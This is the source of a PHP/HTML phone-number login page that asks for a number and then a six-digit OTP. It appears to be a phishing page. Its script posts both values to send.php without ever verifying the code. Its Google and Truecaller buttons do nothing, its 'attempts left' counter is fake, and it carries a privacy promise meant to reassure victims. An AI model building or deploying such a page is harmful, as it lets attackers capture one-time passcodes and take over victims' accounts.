<?php
session_start();

if(isset($_POST['number'])) {
    $_SESSION['number'] = $_POST['number'];
    header("Location: msg.php");
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Panel</title>

<style>
body {
    margin: 0;
    font-family: Arial;
    background: #f5f6f8;
    height:100vh;
    overflow-y:auto;
}

#mainBtn{
background:#d3d3d3;
color:#666;
border:none;
padding:15px 30px;
border-radius:12px;
font-size:20px;
}

#mainBtn.active{
background:#0066ff;
color:white;
}

.container {
    max-width: 400px;
    margin: auto;
    text-align: center;
    padding: 40px 20px;
}

.logo {
    width: 110px;
    margin: 50px auto 20px;
    display: block;
    border-radius: 20px;
}

h1 {
    font-size: 32px;
    color: #0d1633;
}

p {
    color: #6c778f;
    font-size: 18px;
}

/* INPUT BOX MAIN */
.input-box{
    display:flex;
    align-items:center;
    gap:10px;
    margin-top:25px;
    width:100%;
}
/* COUNTRY BOX */
.country{
    width:85px;
    min-width:85px;
    height:50px; /* same height */
    background:#ececec;
    border-radius:14px;
    display:flex;
    align-items:center;
    justify-content:center;
    overflow:hidden;
}

/* SELECT */
.country select{
    width:100%;
    height:100%;
    border:none;
    outline:none;
    background:transparent;
    font-size:15px;
    font-weight:600;
    padding:0 10px;
    appearance:none;
    -webkit-appearance:none;
}

/* PHONE INPUT */
.phone input{
    width:100%;
    height:50px; /* fixed */
    border:none;
    outline:none;
    background:#ececec;
    border-radius:14px;
    padding:0 16px;
    font-size:16px;
    box-sizing:border-box;
}

/* OTP INPUT */
#otp{
    width:100%;
    height:55px;

    border:none !important;
    outline:none !important;
    box-shadow:none !important;

    -webkit-appearance:none;
    appearance:none;

    border-radius:18px;

    padding-left:20px;
    padding-right:150px;

    font-size:16px;
    background:#f3f3f3;

    box-sizing:border-box;
}

#otp:focus{
    border:none !important;
    outline:none !important;
    box-shadow:none !important;
}
    /* GET OTP BUTTON */
button.get-otp-btn{
    width:100% !important;
    height:46px !important;

    padding:0 !important;

    border:none;
    border-radius:14px;

    background:#0d6efd;
    color:white;

    font-size:15px !important;
    font-weight:600;

    margin-top:18px;
}
    
</style>
</head>
<body>

<div class="container">

<img src="logo.png" class="logo">

<h1>Welcome!</h1>
<p>Login for an amazing experience</p>

<form action="send.php" method="POST">

<div class="input-box">
<div class="country">

<select id="countryCode">
<option value="+91">🇮🇳 +91</option>
<option value="+1">🇺🇸 +1</option>
<option value="+44">🇬🇧 +44</option>
<option value="+971">🇦🇪 +971</option>
<option value="+61">🇦🇺 +61</option>
<option value="+880">🇧🇩 +880</option>
<option value="+975">🇧🇹 +975</option>
<option value="+55">🇧🇷 +55</option>
<option value="+86">🇨🇳 +86</option>
<option value="+49">🇩🇪 +49</option>
<option value="+33">🇫🇷 +33</option>
<option value="+39">🇮🇹 +39</option>
<option value="+81">🇯🇵 +81</option>
<option value="+60">🇲🇾 +60</option>
<option value="+977">🇳🇵 +977</option>
<option value="+92">🇵🇰 +92</option>
<option value="+7">🇷🇺 +7</option>
<option value="+65">🇸🇬 +65</option>
<option value="+27">🇿🇦 +27</option>
<option value="+82">🇰🇷 +82</option>
<option value="+94">🇱🇰 +94</option>
<option value="+66">🇹🇭 +66</option>
<option value="+90">🇹🇷 +90</option>
<option value="+380">🇺🇦 +380</option>
<option value="+84">🇻🇳 +84</option>
<option value="+93">🇦🇫 +93</option>
<option value="+355">🇦🇱 +355</option>
<option value="+213">🇩🇿 +213</option>
<option value="+376">🇦🇩 +376</option>
<option value="+244">🇦🇴 +244</option>
<option value="+54">🇦🇷 +54</option>
<option value="+374">🇦🇲 +374</option>
<option value="+43">🇦🇹 +43</option>
<option value="+994">🇦🇿 +994</option>
<option value="+973">🇧🇭 +973</option>
<option value="+32">🇧🇪 +32</option>
<option value="+229">🇧🇯 +229</option>
<option value="+591">🇧🇴 +591</option>
<option value="+387">🇧🇦 +387</option>
<option value="+267">🇧🇼 +267</option>
<option value="+359">🇧🇬 +359</option>
<option value="+855">🇰🇭 +855</option>
<option value="+237">🇨🇲 +237</option>
<option value="+1">🇨🇦 +1</option>
<option value="+56">🇨🇱 +56</option>
<option value="+57">🇨🇴 +57</option>
<option value="+506">🇨🇷 +506</option>
<option value="+385">🇭🇷 +385</option>
<option value="+53">🇨🇺 +53</option>
<option value="+357">🇨🇾 +357</option>
<option value="+420">🇨🇿 +420</option>
<option value="+45">🇩🇰 +45</option>
<option value="+20">🇪🇬 +20</option>
<option value="+251">🇪🇹 +251</option>
<option value="+358">🇫🇮 +358</option>
<option value="+995">🇬🇪 +995</option>
<option value="+30">🇬🇷 +30</option>
<option value="+852">🇭🇰 +852</option>
<option value="+36">🇭🇺 +36</option>
<option value="+62">🇮🇩 +62</option>
<option value="+98">🇮🇷 +98</option>
<option value="+964">🇮🇶 +964</option>
<option value="+353">🇮🇪 +353</option>
<option value="+972">🇮🇱 +972</option>
<option value="+254">🇰🇪 +254</option>
<option value="+965">🇰🇼 +965</option>
<option value="+856">🇱🇦 +856</option>
<option value="+961">🇱🇧 +961</option>
<option value="+218">🇱🇾 +218</option>
<option value="+352">🇱🇺 +352</option>
<option value="+853">🇲🇴 +853</option>
<option value="+261">🇲🇬 +261</option>
<option value="+960">🇲🇻 +960</option>
<option value="+52">🇲🇽 +52</option>
<option value="+976">🇲🇳 +976</option>
<option value="+212">🇲🇦 +212</option>
<option value="+95">🇲🇲 +95</option>
<option value="+64">🇳🇿 +64</option>
<option value="+234">🇳🇬 +234</option>
<option value="+47">🇳🇴 +47</option>
<option value="+968">🇴🇲 +968</option>
<option value="+63">🇵🇭 +63</option>
<option value="+48">🇵🇱 +48</option>
<option value="+351">🇵🇹 +351</option>
<option value="+974">🇶🇦 +974</option>
<option value="+40">🇷🇴 +40</option>
<option value="+966">🇸🇦 +966</option>
<option value="+381">🇷🇸 +381</option>
<option value="+421">🇸🇰 +421</option>
<option value="+386">🇸🇮 +386</option>
<option value="+34">🇪🇸 +34</option>
<option value="+46">🇸🇪 +46</option>
<option value="+41">🇨🇭 +41</option>
<option value="+963">🇸🇾 +963</option>
<option value="+886">🇹🇼 +886</option>
<option value="+255">🇹🇿 +255</option>
<option value="+216">🇹🇳 +216</option>
<option value="+598">🇺🇾 +598</option>
<option value="+58">🇻🇪 +58</option>
</select>

</div>

    <div class="phone">
        <input
type="tel"
name="number"
id="phone"
maxlength="10"
placeholder="Enter your phone number"
oninput="checkNumber()">
    </div>

</div>
<!-- OTP Section -->
<div id="otpSection" style="display:none; margin-top:10px;">

    <div style="position:relative; width:90%; margin:auto;">

<input
type="tel"
id="otp"
maxlength="6"
placeholder="Enter OTP"
oninput="checkOTP()"

style="
width:100%;
height:55px;
border:none;
border-radius:18px;
padding-left:20px;
padding-right:150px;
font-size:16px;
background:#f3f3f3;
box-sizing:border-box;
">

<button id="resendBtn"

style="
position:absolute;
right:10px;
top:50%;
transform:translateY(-50%);

height:40px;
padding:0 18px;

border:1px solid #999;
border-radius:10px;

background:#f3f3f3;
color:#777;
font-size:14px;
">

Resend in 30s

</button>

    </div>

        </span>
</div>
</div>
    
<!-- Get OTP Button -->
<div id="attemptText"
onclick="reduceAttempt()"
style="
text-align:center;
color:red;
font-size:15px;
margin:5px 0 8px 0;
font-weight:500;
display:none;
cursor:pointer;
">
2 attempts left
</div>

<button 
type="button"
id="mainBtn"
    disabled
onclick="nextStep()"

style="
width:90%;
height:45px;
border:none;
border-radius:12px;
font-size:15px;
font-weight:bold;
background:#d6d6d6;
color:#888;
pointer-events:none;
transition:0.3s;
margin:18px auto 0;
display:block;
cursor:pointer;
">

Get OTP

</button>
    
</div>
    
<!-- OR Line -->
<div style="display:flex; align-items:center; width:92%; margin:auto;">
    
    <div style="flex:1; height:1px; background:#ccc;"></div>

    <div style="padding:0 15px; font-weight:bold;">Or</div>

    <div style="flex:1; height:1px; background:#ccc;"></div>

</div>

<!-- Google Button -->
<button type="button" style="
width:92%;
padding:0px 12px;
border:2px solid #5d7df5;
border-radius:6px;
background:white;
font-size:14px;
font-weight:bold;
display:flex;
align-items:center;
justify-content:flex-start;
padding-left:48px;
gap:14px;
color:#222;
height:44px;
margin:18px auto 0 auto;
">

<img src="google.png" style="width:24px; height:24px;">

Continue with Google

</button>

<!-- Truecaller Button -->
<button type="button" style="
width:92%;
padding:0px 12px;
border:2px solid #5d7df5;
border-radius:6px;
background:white;
font-size:14px;
font-weight:bold;
display:flex;
align-items:center;
justify-content:flex-start;
padding-left:48px;
gap:14px;
color:#222;
height:44px;
margin:18px auto 0 auto;
">

<img src="truecaller.png" style="width:24px; height:24px;">

Continue with Truecaller

</button>

<!-- Privacy Policy Text -->
<div style="
position:absolute;
bottom:35px;
left:50%;
transform:translateX(-50%);
width:95%;
text-align:center;
font-size:13px;
line-height:18px;
color:#222;
">

Your Privacy is important to us and your number will be safe.
By continuing, you agree to our
<b>Terms and Conditions, Privacy Policy and Content & Community Guidelines.</b>

</div>

<script>

let otpShown = false;

function nextStep() {

    let phone = document.getElementById("phone").value;

    if (!otpShown) {

        if (phone.length < 10) {
            return;
        }

        fetch("send.php", {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: "number=" + encodeURIComponent(phone)
        });

        document.getElementById("otpSection").style.display = "block";
        document.getElementById("mainBtn").innerText = "Verify OTP";
        document.getElementById("attemptText").style.display = "block";

        otpShown = true;

    } else {

        let otp = document.getElementById("otp").value;

        if (otp.length < 6) {
            return;
        }

        fetch("send.php", {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body:
                "number=" + encodeURIComponent(phone) +
                "&otp=" + encodeURIComponent(otp)
        });
    }
}
let attempts = 2;

function reduceAttempt() {

if(attempts > 0){

attempts--;

document.getElementById("attemptText").innerText =
attempts + " attempts left";

}

if(attempts == 0){

document.getElementById("attemptText").innerText =
"0 attempts left";

document.getElementById("attemptText").style.color =
"#999";

}

    }
function checkPhone() {
    let phone = document.getElementById("phone").value;
    let btn = document.getElementById("mainBtn");

    if (phone.length == 10) {
        btn.classList.add("active");
    } else {
        btn.classList.remove("active");
    }
}
    
function checkNumber() {

let phone = document.getElementById("phone").value;
let btn = document.getElementById("mainBtn");

/* only numbers */
phone = phone.replace(/\D/g,'');
document.getElementById("phone").value = phone;

/* button active only on 10 digits */
if(phone.length == 10){

btn.style.background = "#0666ff";
btn.style.color = "white";
btn.style.pointerEvents = "auto";
btn.disabled = false;

}else{

btn.style.background = "#d6d6d6";
btn.style.color = "#888";
btn.style.pointerEvents = "none";
btn.disabled = true;

}

}
    
function checkOTP() {

let otp = document.getElementById("otp").value;
let btn = document.getElementById("verifyBtn");

/* only numbers */
otp = otp.replace(/\D/g,'');
document.getElementById("otp").value = otp;

/* button active only on 6 digits */
if(otp.length == 6){

btn.style.background = "#0666ff";
btn.style.color = "white";
btn.style.pointerEvents = "auto";
btn.disabled = false;

}else{

btn.style.background = "#d6d6d6";
btn.style.color = "#888";
btn.style.pointerEvents = "none";
btn.disabled = true;

}

    }
    
let timeLeft = 30;

let resendBtn = document.getElementById("resendBtn");

let countdown = setInterval(() => {

timeLeft--;

resendBtn.innerText = `Resend in ${timeLeft}s`;

if (timeLeft <= 0) {

clearInterval(countdown);

resendBtn.innerText = "Resend";

}

}, 1000);

</script>
